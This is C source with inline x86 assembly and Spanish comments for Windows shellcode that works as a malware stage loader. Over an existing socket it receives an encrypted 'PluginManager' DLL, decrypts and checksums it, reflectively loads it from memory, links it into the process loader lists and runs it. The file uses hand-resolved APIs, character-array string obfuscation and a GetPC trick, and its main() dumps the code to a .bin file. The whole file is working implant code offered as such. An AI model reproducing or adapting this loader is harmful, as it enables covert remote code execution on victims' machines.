#include <windows.h>
#include <stdio.h>

//kernel32.dll
typedef HMODULE (WINAPI *_LoadLibraryA)(LPCTSTR lpFileName);
typedef FARPROC (WINAPI *_GetProcAddress)(HMODULE hModule, LPCTSTR lpProcName);
typedef BOOL (WINAPI *_VirtualProtect)(LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);
//ws2_32.dll
typedef int (WINAPI *_recv)(SOCKET s, char *buf, int len, int flags);
typedef int (WINAPI *_send)(SOCKET s, const char *buf, int len, int flags);
//advapi32.dll
typedef BOOL (WINAPI *_CryptDecrypt)(HCRYPTKEY hKey, HCRYPTHASH hHash, BOOL Final, DWORD dwFlags, BYTE *pbData, DWORD *pdwDataLen);
typedef BOOL (WINAPI *_CryptEncrypt)(HCRYPTKEY hKey, HCRYPTHASH hHash, BOOL Final, DWORD dwFlags, BYTE *pbData, DWORD *pdwDataLen, DWORD dwBufLen);
//msvcrt.dll
typedef void * (__cdecl *_malloc)(size_t _Size);

struct SHELLCODE_CONTEXT{
    HMODULE                         KERNEL32;
    _LoadLibraryA                   LoadLibraryA__;
    _GetProcAddress                 GetProcAddress_A_;
    HMODULE                         WS2_32;
    _recv                           recv_;
    _send                           send_;
    HMODULE                         ADVAPI32;
    _CryptDecrypt                   CryptDecrypt_;
    _CryptEncrypt                   CryptEncrypt_;
    HMODULE                         MSVCRT;
    _malloc                         malloc__;
    /**/
    SOCKET                          hSocket;
    HCRYPTKEY                       hKey;
    DWORD                           Delta;
};

typedef HINSTANCE (__stdcall *LoadLibraryFromMemory_)(void* AddrBase,const char* ModName);
typedef void* (__stdcall *FreeLibraryFromMemory_)(void* AddrBase);
typedef struct LoaderFunTable{
    //Puntero a las funciones para la carga y descarga de módulos desde memoria
    LoadLibraryFromMemory_ LLFM;
    FreeLibraryFromMemory_ FLFM;
    //Puntero a los punteros que usan las funciones anteriores para estas APIs
    //Están en una zona con permisos ReadExecute, pero se pueden cambiar
    unsigned long** LoadLibraryA;
    unsigned long** GetProcAddress;
}LoaderFunTable;

void scInit(_LoadLibraryA pLoadLibA, _GetProcAddress pGPA, SOCKET hSocket, HCRYPTKEY hKEY);
void Start(_LoadLibraryA pLoadLibA, _GetProcAddress pGPA, SOCKET hSocket, HCRYPTKEY hKEY);
void Payload(SHELLCODE_CONTEXT *scc);

void PEEntry();
void PELoadIAT();
void PEBaseReloc();
void AddLdrModules();
void memcpy_();
void AscToUni();
void lstrlenA_();
void PEGetSectionHeader();
void PEGetNT_HEADER();
void DelLdrModule();
void GetLdrModule();

void __declspec(naked) Start(_LoadLibraryA pLoadLibA, _GetProcAddress pGPA, SOCKET hSocket, HCRYPTKEY hKEY){
    __asm{
        jmp scInit
    }
}

#pragma region(LibShits)
void __declspec(naked) VirtualProtect_(){
    __asm{
        push	0x12345678
        ret
    }
}
void __declspec(naked) LoadLibraryA_(){
    __asm{
        push	0x12345677
        ret
    }
}
void __declspec(naked) GetProcAddress_(){
    __asm{
        push	0x12345676
        ret
    }
}
void __declspec(naked) malloc_(){
    __asm{
        push	0x12345675
        ret
    }
}
void __declspec(naked) TlsAlloc_(){
    __asm{
        push	0x12345674
        ret
    }
}
void __declspec(naked) TlsSetValue_(){
    __asm{
        push	0x12345673
        ret
    }
}
void __declspec(naked) VirtualAlloc_(){
    __asm{
        push	0x12345672
        ret
    }
}
void __declspec(naked) VirtualFree_(){
    __asm{
        push	0x12345671
        ret
    }
}
HINSTANCE __declspec(naked) LoadLibraryFromMemory(void* AddrBase,const char* ModName){
    __asm{
        push	ebp
        mov	ebp, esp
        sub	esp, 20h
        pushad
        push	[ebp+0x08]
        call	PEGetNT_HEADER
        mov	[ebp-0x0C], eax
        push	eax
        push	[ebp+0x08]
        call	PEGetSectionHeader
        mov	[ebp-0x10], eax
        mov	ebx, [ebp-0x0C]
        push	40h ; '@'
        push	2000h
        push	dword ptr [ebx+50h]
        push	dword ptr [ebx+34h]
        mov	[ebp-0x04], edx
        mov	[ebp-0x08], ecx
        call	VirtualAlloc_
        mov	edx, [ebp-0x04]
        mov	ecx, [ebp-0x08]
        mov	[ebp-0x18], eax
        test	eax, eax
        jz	_exit
        mov	esi, [ebp+0x08]
        push	48h ; 'H'
        mov	[ebp-0x04], edx
        mov	[ebp-0x08], ecx
        call	malloc_
        mov	edx, [ebp-0x04]
        mov	ecx, [ebp-0x08]
        add	esp, 4
        mov	[ebp-0x14], eax
        mov	ecx, [ebx+50h]
        mov	edx, [ebx+28h]
        mov	[ebp-0x04], edx
        mov	[ebp-0x08], ecx
        call	TlsAlloc_
        mov	edx, [ebp-0x04]
        mov	ecx, [ebp-0x08]
        mov	edi, [ebp-0x18]
        add	edx, edi
        mov	eax, [ebp-0x14]
        mov	[eax+18h], edi
        mov	[eax+20h], ecx
        mov	[eax+1Ch], edx
        mov	[eax+3Ah], ax
        mov	word ptr [eax+38h], 1
        push	[ebp+0x0C]
        mov	[ebp-0x04], edx
        mov	[ebp-0x08], ecx
        call	lstrlenA_
        mov	edx, [ebp-0x04]
        mov	ecx, [ebp-0x08]
        mov	ecx, eax
        inc	ecx
        shl	ecx, 1
        push	ecx
        mov	[ebp-0x04], edx
        mov	[ebp-0x08], ecx
        call	malloc_
        mov	edx, [ebp-0x04]
        mov	ecx, [ebp-0x08]
        add	esp, 4
        mov	ebx, eax
        push	ebx
        push	[ebp+0x0C]
        call	AscToUni
        mov	eax, [ebp-0x14]
        mov	[eax+24h], cx
        mov	[eax+26h], cx
        mov	[eax+28h], ebx
        mov	[eax+2Ch], cx
        mov	[eax+2Eh], cx
        mov	[eax+30h], ebx
        mov	dword ptr [eax+3Ch], 0FFFFFFFFh
        mov	ebx, [ebp-0x0C]
        mov	ecx, [ebx+58h]
        mov	[eax+40h], ecx
        mov	ecx, [ebx+8]
        mov	dword ptr [eax+44h], 0
        mov	dword ptr [eax+34h], 80005000h
        mov	eax, [ebp-0x18]
        cmp	[ebx+34h], eax
        jnz	_reloc

    _reloc_continue:
        mov	ecx, [ebx+54h]
        push	40h ; '@'
        push	1000h
        push	ecx
        push	eax
        mov	[ebp-0x04], edx
        mov	[ebp-0x08], ecx
        call	VirtualAlloc_
        mov	edx, [ebp-0x04]
        mov	ecx, [ebp-0x08]
        test	eax, eax
        jz	_exit
        push	ecx
        push	esi
        push	eax
        call	memcpy_
        lea	edx, [ebp-0x1C]
        push	edx
        push	2
        push	ecx
        push	eax
        mov	[ebp-0x04], edx
        mov	[ebp-0x08], ecx
        call	VirtualProtect_
        mov	edx, [ebp-0x04]
        mov	ecx, [ebp-0x08]
        xor	ecx, ecx
        mov	cx, [ebx+6]
        push	ebx
        push	esi
        call	PEGetSectionHeader
        mov	edx, eax

    _SectLoad:
        dec	ecx
        mov	eax, [edx+0Ch]
        add	eax, [ebp-0x18]
        mov	ebx, [edx+14h]
        add	ebx, esi
        push	40h ; '@'
        push	1000h
        push	dword ptr [edx+8]
        push	eax
        mov	[ebp-0x04], edx
        mov	[ebp-0x08], ecx
        call	VirtualAlloc_
        mov	edx, [ebp-0x04]
        mov	ecx, [ebp-0x08]
        push	dword ptr [edx+10h]
        push	ebx
        push	eax
        call	memcpy_
        test	dword ptr [edx+24h], 20000000h
        jnz	short _SECTION_CODE
        test	dword ptr [edx+24h], 80000000h
        jnz	short _SECTION_DATA
        test	dword ptr [edx+24h], 40000000h
        jnz	short _SECTION_RDATA
        mov	[ebp-0x1C], 1
        jmp	short _SECTION_PROTECT_END

    _SECTION_CODE:				
        mov	[ebp-0x1C], 20h ; ' '
        jmp	short _SECTION_PROTECT_END

    _SECTION_DATA:				
        mov	[ebp-0x1C], 4
        jmp	short _SECTION_PROTECT_END

    _SECTION_RDATA:
        mov	[ebp-0x1C], 2

    _SECTION_PROTECT_END:
        lea	ebx, [ebp-0x1C]
        push	ebx
        push	dword ptr [ebx]
        push	dword ptr [edx+8]
        push	eax
        mov	[ebp-0x04], edx
        mov	[ebp-0x08], ecx
        call	VirtualProtect_
        mov	edx, [ebp-0x04]
        mov	ecx, [ebp-0x08]
        add	edx, 28h ; '('
        test	ecx, ecx
        jnz	_SectLoad
        push	[ebp-0x18]
        call	PEGetNT_HEADER
        mov	[ebp-0x0C], eax
        push	[ebp-0x14]
        call	AddLdrModules
        mov	ecx, [ebp-0x14]
        test	[ebp-0x1D], 1
        jz	short _NoReloc
        or	dword ptr [ecx+34h], 200000h
        push	[ebp-0x0C]
        push	[ebp-0x18]
        call	PEBaseReloc

    _NoReloc:
        push	[ebp-0x0C]
        push	[ebp-0x18]
        call	PELoadIAT
        push	1
        push	[ebp-0x0C]
        push	[ebp-0x14]
        push	[ebp-0x18]
        call	PEEntry
        and	dword ptr [ecx+34h], 0FFFFEFFFh
        jmp	short _end
        _reloc:
        test	word ptr [ebx+5Eh], 40h
        jz	short _exit
        mov	[ebp-0x1D], 1
        jmp	_reloc_continue
    _exit:
        mov	eax, 0FFFFFFFFh
        jmp	short _end_error
    _end:
        mov	eax, [ebp-0x18]

    _end_error:
        mov	eax, eax
        mov	[esp+90h-0x74], eax
        popad
        leave
        ret	8
    }
}

void __declspec(naked)FreeLibraryFromMemory(){
    __asm{
        push	ebp
        mov	ebp, esp
        sub	esp, 10h
        pushad
        push	[ebp+0x08]
        call	GetLdrModule
        test	eax, eax
        jz	short _error1
        mov	ebx, eax
        push	[ebp+0x08]
        call	PEGetNT_HEADER
        mov	[ebp-0x0C], eax
        push	0
        push	eax
        push	ebx
        push	[ebp+0x08]
        call	PEEntry
        push	ebx
        call	DelLdrModule
        push	8000h
        push	0
        push	[ebp+0x08]
        mov	[ebp-0x04], edx
        mov	[ebp-0x08], ecx
        call	VirtualFree_
        mov	edx, [ebp-0x04]
        mov	ecx, [ebp-0x08]
        mov	al, 1
        jmp	short _NoError1
    _error1:
        xor	eax, eax

    _NoError1:
        mov	eax, eax
        mov	[esp+30h-0x14], eax
        popad
        leave
        ret	4
    }
}

void __declspec(naked)PEGetNT_HEADER(){
    __asm{
        push	ebp
        mov	ebp, esp
        push	edx
        push	edi
        mov	edx, [ebp+0x08]
        cmp	word ptr [edx],	5A4Dh
        jnz	short _error_NoDOS_head
        mov	eax, [edx+3Ch]
        lea	edi, [eax+edx]
        cmp	dword ptr [edi], 4550h
        jnz	short _error_NoDOS_head
        mov	eax, edi
        jmp	short _end1
        _error_NoDOS_head:
        xor	eax, eax
        _end1:
        pop	edi
        pop	edx
        leave
        ret	4
    }
}

void __declspec(naked)PEGetSectionHeader(){
    __asm{
        push	ebp
        mov	ebp, esp
        sub	esp, 0Ch
        mov	eax, [ebp+0x0C]
        movzx	eax, word ptr [eax+14h]
        add	eax, [ebp+0x0C]
        add	eax, 18h
        leave
        ret	8
    }
}

void __declspec(naked)PEGetDirectoryEntry(){
    __asm{
        push	ebp
        mov	ebp, esp
        push	ebx
        mov	eax, [ebp+0x0C]
        mov	ebx, [ebp+0x10]
        shl	ebx, 3
        mov	eax, [eax+ebx+78h]
        test	eax, eax
        jz	short _IsEmpty
        add	eax, [ebp+0x08]
        mov	esi, [ebp+0x14]
        test	esi, esi
        jz	short _IsEmpty
        mov	edx, [eax+ebx+7Ch]
        mov	[esi], edx
    _IsEmpty:
        pop	ebx
        leave
        ret	10h
    }
}

void __declspec(naked)PEBaseReloc(){
    __asm{
        push	ebp
        mov	ebp, esp
        sub	esp, 14h
        lea	eax, [ebp-0x0C]
        push	eax
        push	5
        push	[ebp+0x0C]
        push	[ebp+0x08]
        call	PEGetDirectoryEntry
        test	eax, eax
        jz	_NotFound
        mov	esi, [ebp+0x08]
        mov	eax, [ebp+0x0C]
        sub	esi, [eax+34h]
        mov	[ebp-0x10], esi

    _NextBR:				
        mov	edx, [eax+4]
        mov	ecx, edx
        mov	ebx, [eax]
        add	ebx, [ebp+0x08]
        add	eax, 8
        sub	ecx, 8

    _NextEntry:		
        sub	ecx, 2
        mov	di, [eax+ecx]
        shr	di, 0Ch
        test	di, di
        jnz	short _NotAbsolute
        jmp	short _Continue

    _NotAbsolute:		
        cmp	di, 1
        jnz	short _NotHigh
        movzx	edi, word ptr [eax+ecx]
        and	di, 0FFFh
        jmp	short _Continue
        shr	esi, 10h
        add	[edi+ebx+2], si
        mov	esi, [ebp-0x10]

    _NotHigh:
        cmp	di, 2
        jnz	short _NotLow
        movzx	edi, word ptr [eax+ecx]
        and	di, 0FFFh
        jmp	short _Continue
        add	[edi+ebx], si

    _NotLow:
        cmp	di, 3
        jnz	short _Continue
        movzx	edi, word ptr [eax+ecx]
        and	di, 0FFFh
        jmp	short _Continue
        add	[edi+ebx], esi

    _Continue:
        test	ecx, ecx
        jnz	short _NextEntry
        add	eax, edx
        sub	eax, 8
        sub	[ebp-0x0C], edx
        jnz	short _NextBR

    _NotFound:
        leave
        ret	8
    }
}

void __declspec(naked)PELoadTls(){
    __asm{
        push	ebp
        mov	ebp, esp
        sub	esp, 18h
        pushad
        push	0
        push	9
        push	[ebp+0x0C]
        push	[ebp+0x08]
        call	PEGetDirectoryEntry
        test	eax, eax
        jz	short _NotFound
        mov	ebx, eax
        mov	[ebp-0x04], edx
        mov	[ebp-0x08], ecx
        call	TlsAlloc_
        mov	edx, [ebp-0x04]
        mov	ecx, [ebp-0x08]
        mov	[ebp-0x14], eax
        mov	edx, [ebx+8]
        mov	[edx], eax
        mov	edx, [ebx]
        mov	[ebp-0x0C], edx
        mov	ecx, [ebx+4]
        sub	ecx, edx
        mov	[ebp-0x10], ecx
        push	ecx
        mov	[ebp-0x04], edx
        mov	[ebp-0x08], ecx
        call	malloc_
        mov	edx, [ebp-0x04]
        mov	ecx, [ebp-0x08]
        add	esp, 4
        mov	esi, eax
        push	ecx
        push	edx
        push	esi
        call	memcpy_
        push	esi
        push	[ebp-0x14]
        mov	[ebp-0x04], edx
        mov	[ebp-0x08], ecx
        call	TlsSetValue_
        mov	edx, [ebp-0x04]
        mov	ecx, [ebp-0x08]
        mov	edx, [ebx+0Ch]

    _tlsNext:
        cmp	dword ptr [edx], 0
        jz	short _NotFound
        push	0
        push	[ebp+0x10]
        push	[ebp+0x08]
        mov	[ebp-0x04], edx
        mov	[ebp-0x08], ecx
        call	dword ptr [edx]
        mov	edx, [ebp-0x04]
        mov	ecx, [ebp-0x08]
        add	edx, 4
        jmp	short _tlsNext

    _NotFound:
        popad
        leave
        ret	0Ch
    }
}

void __declspec(naked)PELoadIAT(){
    __asm{
        push	ebp
        mov	ebp, esp
        sub	esp, 14h
        pushad
        push	0
        push	1
        push	[ebp+0x0C]
        push	[ebp+0x08]
        call	PEGetDirectoryEntry
        mov	[ebp-0x0C], eax
        mov	ebx, eax

    _nextImportModule:
        mov	eax, [ebx+0Ch]
        test	eax, eax
        jz	_endLoad
        add	eax, [ebp+0x08]
        push	eax
        mov	[ebp-0x04], edx
        mov	[ebp-0x08], ecx
        call	LoadLibraryA_
        mov	edx, [ebp-0x04]
        mov	ecx, [ebp-0x08]
        mov	edx, eax
        mov	esi, [ebx+10h]
        add	esi, [ebp+0x08]
        lea	eax, [ebp-0x10]
        push	eax
        push	4
        push	1000h
        mov	eax, [ebx+10h]
        add	eax, [ebp+0x08]
        push	eax
        mov	[ebp-0x04], edx
        mov	[ebp-0x08], ecx
        call	VirtualProtect_
        mov	edx, [ebp-0x04]
        mov	ecx, [ebp-0x08]
        xor	ecx, ecx

    _nextImportFunc:
        test	dword ptr [esi+ecx], 0FFFFFFFFh
        jz	short _endImportFunc
        mov	eax, [esi+ecx]
        add	eax, [ebp+0x08]
        lea	eax, [eax+2]
        push	eax
        push	edx
        mov	[ebp-0x04], edx
        mov	[ebp-0x08], ecx
        call	GetProcAddress_
        mov	edx, [ebp-0x04]
        mov	ecx, [ebp-0x08]
        mov	[esi+ecx], eax
        add	ecx, 4
        jmp	short _nextImportFunc

    _endImportFunc:
        lea	eax, [ebp-0x10]
        push	eax
        push	dword ptr [eax]
        push	1000h
        mov	eax, [ebx+10h]
        add	eax, [ebp+0x08]
        push	eax
        mov	[ebp-0x04], edx
        mov	[ebp-0x08], ecx
        call	VirtualProtect_
        mov	edx, [ebp-0x04]
        mov	ecx, [ebp-0x08]
        lea	ebx, [ebx+14h]
        jmp	_nextImportModule

    _endLoad:
        popad
        leave
        ret	8
    }
}

void __declspec(naked)PEEntry(){
    __asm{
        push	ebp
        mov	ebp, esp
        sub	esp, 0Ch
        pushad
        and	[ebp+0x14], 1
        push	[ebp+0x14]
        push	[ebp+0x10]
        push	[ebp+0x08]
        call	PELoadTls
        mov	ebx, [ebp+0x0C]
        mov	ebx, [ebp+0x0C]
        mov	eax, [ebx+1Ch]
        test	eax, eax
        jz	short _NoMain
        test	[ebp+0x14], 1
        jz	short _detach
        or	dword ptr [ebx+34h], 80000h
        jmp	short _attached

    _detach:
        and	dword ptr [ebx+34h], 0FFF7FFFFh

    _attached:
        push	0
        push	[ebp+0x14]
        push	[ebp+0x08]
        call	eax
        jmp	short PEEntry_end

    _NoMain:
        push	0B31h
        push	[ebp+0x08]
        mov	[ebp-0x04], edx
        mov	[ebp-0x08], ecx
        call	GetProcAddress_
        mov	edx, [ebp-0x04]
        mov	ecx, [ebp-0x08]
        and	dword ptr [ebx+34h], 0FFFFEFFFh
        test	eax, eax
        jz	short PEEntry_end
        push	0
        push	[ebp+0x14]
        push	[ebp+0x08]
        call	eax
        test	[ebp+0x14], 1
        jz	short loc_943
        or	dword ptr [ebx+34h], 80000h
        jmp	short PEEntry_end

    loc_943:
        and	dword ptr [ebx+34h], 0FFF7FFFFh

    PEEntry_end:
        popad
        leave
        ret	10h
    }
}

void __declspec(naked)AddLdrModules(){
    __asm{
        push	ebp
        mov	ebp, esp
        sub	esp, 0Ch
        pushad
        mov	esi, [ebp+0x08]
        mov	eax, dword ptr fs:0x30
        mov	eax, [eax+0Ch]
        lea	eax, [eax+0Ch]
        mov	ebx, [eax+4]
        mov	[eax+4], esi
        mov	[ebx], esi
        mov	[esi+4], ebx
        mov	[esi], eax
        lea	edi, [esi+10h]
        lea	edx, [eax+10h]
        mov	ebx, [edx+4]
        mov	[edx+4], edi
        mov	[ebx], edi
        mov	[edi+4], ebx
        mov	[edi], edx
        mov	ecx, [esi+18h]
        lea	esi, [esi+8]
        lea	edi, [eax+8]
        mov	ebx, [edi+4]

    _SearchMemoryOrder:	
        cmp	[ebx+10h], ecx
        ja	short _NoFind
        mov	ecx, [ebx]
        mov	[ebx], esi
        mov	[ecx+4], esi
        mov	[esi], ecx
        mov	[esi+4], ebx
        jmp	short _end2

    _NoFind:	
        mov	ebx, [ebx+4]
        cmp	ebx, eax
        jz	short _end2
        jmp	short _SearchMemoryOrder

    _end2:
        push	0B4Fh
        push	dword ptr [esi+10h]
        mov	[ebp-0x04], edx
        mov	[ebp-0x08], ecx
        call	GetProcAddress_
        mov	edx, [ebp-0x04]
        mov	ecx, [ebp-0x08]
        popad
        leave
        ret	4
    }
}

void __declspec(naked)GetLdrModule(){
    __asm{
        push	ebp
        mov	ebp, esp
        sub	esp, 0Ch
        pushad
        mov	esi, [ebp+0x08]
        mov	eax, dword ptr fs:0x30
        mov	eax, [eax+0Ch]
        lea	ebx, [eax+0Ch]
        mov	ecx, ebx

    _NextNode:
        cmp	esi, [ebx+18h]
        jz	short _ModuleFound
        mov	ebx, [ebx+4]
        cmp	ebx, ecx
        jnz	short _NextNode
        xor	ebx, ebx

    _ModuleFound:
        mov	eax, ebx
        mov	[esp+2Ch-0x10], eax
        popad
        leave
        ret	4
    }
}

void __declspec(naked)DelLdrModule(){
    __asm{
        push	ebp
        mov	ebp, esp
        sub	esp, 0Ch
        pushad
        mov	esi, [ebp+0x08]
        mov	ecx, [esi]
        mov	edx, [esi+4]
        mov	[ecx+4], edx
        mov	[edx], ecx
        mov	ecx, [esi+8]
        mov	edx, [esi+0Ch]
        mov	ecx, [esi+10h]
        mov	edx, [esi+14h]
        popad
        leave
        ret	4
    }
}

void __declspec(naked)memcpy_(){
    __asm{
        push	ebp
        mov	ebp, esp
        sub	esp, 0Ch
        pushad
        mov	esi, [ebp+0x0C]
        mov	edi, [ebp+0x08]
        mov	ecx, [ebp+0x10]
        rep movsb
        mov	eax, [ebp+0x08]
        mov	[esp+2Ch-0x10], eax
        popad
        leave
        ret	0Ch
    }
}

void __declspec(naked)lstrlenA_(){
    __asm{
        push	ebp
        mov	ebp, esp
        sub	esp, 0Ch
        pushad
        xor	ecx, ecx
        mov	eax, ecx
        dec	ecx
        mov	edi, [ebp+0x08]
        repne scasb
        inc	ecx
        not	ecx
        mov	eax, ecx
        mov	[esp+2Ch-0x10], eax
        popad
        leave
        ret	4
    }
}

void __declspec(naked)AscToUni(){
    __asm{
        push	ebp
        mov	ebp, esp
        sub	esp, 0Ch
        pushad
        mov	esi, [ebp+0x08]
        mov	edi, [ebp+0x0C]
        xor	eax, eax

    loc_1ED:
        lodsb
        stosw
        test	eax, eax
        jnz	short loc_1ED
        popad
        leave
        ret	8
    }
}

#pragma endregion

void Payload(SHELLCODE_CONTEXT *scc){
    //Enviamos el OK al cliente.
    char ok[16]     = {0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x0};
    DWORD dwDSize   = 15;
    scc->CryptEncrypt_(scc->hKey, 0, true, 0, (BYTE*)ok, &dwDSize, sizeof(ok));

    scc->send_(scc->hSocket, ok, sizeof(ok), 0);

    //Recibimos el tamaño del PluginManager
    DWORD dwSize    = 0;
    if ((scc->recv_(scc->hSocket, (char*)&dwSize, sizeof(DWORD), 0) == 4)&&(dwSize > 0)){   //Si lo que hemos recibido es un DWORD y nos han aceptado el OK...
        //Hacemos sitio para almacenar el PluginManager
        char* bBuff = (char*)scc->malloc__(dwSize);
        if (bBuff > 0){
            DWORD dwASize   = dwSize;
            DWORD lResult   = 0;
            bool  bReceived = true;

            //Recibimos el PluginManager
            while ((dwASize > 0) && (bReceived==true)){
                lResult = scc->recv_(scc->hSocket, (char*)(bBuff+(dwSize-dwASize)), dwASize, 0);
                dwASize -= lResult;
                if(lResult < 0)
                    bReceived = false;
            }
            dwDSize = dwSize;

            //Lo desciframos
            if ((bReceived==true)&&(scc->CryptDecrypt_(scc->hKey, 0, true, 0, (BYTE*)bBuff, &dwDSize) == 1)){
                //Procedemos a comprobar el Checksum
                DWORD oChecksum = *(DWORD*)bBuff;
                //Saltamos el Checksum de los datos recibidos
                bBuff += 4;
                DWORD nChecksum = 0;

                for(DWORD i = 0; i < dwSize-4;i++){
                    nChecksum ^= (BYTE)bBuff[i];
                    nChecksum *= 0x1EF30EB;
                };

                //Si el checksum coincide
                if (nChecksum == oChecksum){
                    //Cargamos y ejecutamos el PluginManager
                    char sPluginName[]  = {'p', 'm', '.', 'd', 'l', 'l', '\0'};
                    char sPMEntry[]     = {'I', 'n', 'i', 't', 'P', 'l', 'u', 'g', 'i', 'n', 'L', 'o', 'a', 'd','e', 'r', '@', '1', '2', '\0'};
                    PVOID hMod = (PVOID)LoadLibraryFromMemory(bBuff, sPluginName);
                    if (hMod){
                        typedef int (WINAPI *InitPluginLoader)(SOCKET hConexion, HCRYPTKEY hKey, LoaderFunTable& lFunc);
                        InitPluginLoader MainFunc = (InitPluginLoader)scc->GetProcAddress_A_((HMODULE)hMod, sPMEntry);
                        LoaderFunTable LFT;
                        LFT.FLFM                    = (FreeLibraryFromMemory_)((PBYTE)FreeLibraryFromMemory + scc->Delta);
                        LFT.LLFM                    = (LoadLibraryFromMemory_)((PBYTE)LoadLibraryFromMemory + scc->Delta);
                        LFT.GetProcAddress          = (unsigned long**)((PBYTE)GetProcAddress_ + scc->Delta);
                        LFT.LoadLibraryA            = (unsigned long**)((PBYTE)LoadLibraryA_ + scc->Delta);
                        MainFunc(scc->hSocket, scc->hKey, LFT);
                    }
                }
            }
        }
    }
    return;
}

void scInit(_LoadLibraryA pLoadLibA, _GetProcAddress pGPA, SOCKET hSocket, HCRYPTKEY hKEY){
    SHELLCODE_CONTEXT scc;
    DWORD tDelta;
    __asm{
find_delta: 
        fldln2
        __emit 0xD9
        __emit 0x74
        __emit 0x24
        __emit 0xF4
        pop  eax
        sub  eax, find_delta
        mov  tDelta, eax
    }

    scc.Delta               = tDelta;
    scc.LoadLibraryA__      = pLoadLibA;
    scc.GetProcAddress_A_   = pGPA;
    scc.hSocket             = hSocket;
    scc.hKey                = hKEY;
    
    char sKERNEL32[]        = {'k', 'e', 'r', 'n', 'e', 'l', '3', '2', '\0'};
    char sVirtualProtect[]  = {'V', 'i', 'r', 't', 'u', 'a', 'l', 'P', 'r', 'o', 't', 'e', 'c', 't', '\0'};
    char sTlsAlloc[]        = {'T', 'l', 's', 'A', 'l', 'l', 'o', 'c', '\0'};
    char sTlsSetValue[]     = {'T', 'l', 's', 'S', 'e', 't', 'V', 'a', 'l', 'u', 'e', '\0'};
    char sVirtualAlloc[]    = {'V', 'i', 'r', 't', 'u', 'a', 'l', 'A', 'l', 'l', 'o', 'c', '\0'};
    char sVirtualFree[]     = {'V', 'i', 'r', 't', 'u', 'a', 'l', 'F', 'r', 'e', 'e', '\0'};

    char sWS2_32[]          = {'w', 's', '2', '_', '3', '2', '\0'};
    char ssend[]            = {'s', 'e', 'n', 'd', '\0'};
    char srecv[]            = {'r', 'e', 'c', 'v', '\0'};

    char sADVAPI32[]        = {'a', 'd', 'v', 'a', 'p', 'i', '3', '2', '\0'};
    char sCryptDecrypt[]    = {'C', 'r', 'y', 'p', 't', 'D', 'e', 'c', 'r', 'y', 'p', 't', '\0'};
    char sCryptEncrypt[]    = {'C', 'r', 'y', 'p', 't', 'E', 'n', 'c', 'r', 'y', 'p', 't', '\0'};

    char sMSVCRT[]          = {'m', 's', 'v', 'c', 'r', 't', '\0'};
    char smalloc_[]          = {'m', 'a', 'l', 'l', 'o', 'c', '\0'};

    scc.WS2_32              = pLoadLibA(sWS2_32);
    scc.send_               = (_send)pGPA(scc.WS2_32, ssend);
    scc.recv_               = (_recv)pGPA(scc.WS2_32, srecv);

    scc.ADVAPI32            = pLoadLibA(sADVAPI32);
    scc.CryptDecrypt_       = (_CryptDecrypt)pGPA(scc.ADVAPI32, sCryptDecrypt);
    scc.CryptEncrypt_       = (_CryptEncrypt)pGPA(scc.ADVAPI32, sCryptEncrypt);

    scc.MSVCRT              = pLoadLibA(sMSVCRT);
    scc.malloc__             = (_malloc)pGPA(scc.MSVCRT, smalloc_);

    //Parcheamos direcciones para LoadLibraryFromMemory()
    *(DWORD*)((PBYTE)LoadLibraryA_ + tDelta + 1)            = (DWORD)pLoadLibA;
    *(DWORD*)((PBYTE)GetProcAddress_ + tDelta + 1)          = (DWORD)pGPA;
    *(DWORD*)((PBYTE)malloc_ + tDelta + 1)                  = (DWORD)scc.malloc__;
    *(DWORD*)((PBYTE)VirtualProtect_ + tDelta + 1)          = (DWORD)pGPA(pLoadLibA(sKERNEL32), sVirtualProtect);
    *(DWORD*)((PBYTE)TlsAlloc_ + tDelta + 1)                = (DWORD)pGPA(pLoadLibA(sKERNEL32), sTlsAlloc);
    *(DWORD*)((PBYTE)TlsSetValue_ + tDelta + 1)             = (DWORD)pGPA(pLoadLibA(sKERNEL32), sTlsSetValue);
    *(DWORD*)((PBYTE)VirtualAlloc_ + tDelta + 1)            = (DWORD)pGPA(pLoadLibA(sKERNEL32), sVirtualAlloc);
    *(DWORD*)((PBYTE)VirtualFree_ + tDelta + 1)             = (DWORD)pGPA(pLoadLibA(sKERNEL32), sVirtualFree);

    Payload(&scc);
    __asm{
        leave 
        ret 0x10
    }
    return;
}


//Código utilizado para generar ".bin" y debuggear la shellcode
int main(int argc, char **argv){
    FILE *pfBin;
    size_t dwSize;
    char szBinFile[MAX_PATH];

    dwSize = (PBYTE)main - (PBYTE)Start;

    sprintf_s(szBinFile, MAX_PATH, "%s.bin", argv[0]);
    
    fopen_s(&pfBin, szBinFile, "wb");
    fwrite((PBYTE)Start, dwSize, 1, pfBin);
    fclose(pfBin);

    //Start(&LoadLibraryA_, &GetProcAddress_, 0, 0);

    return 0;
}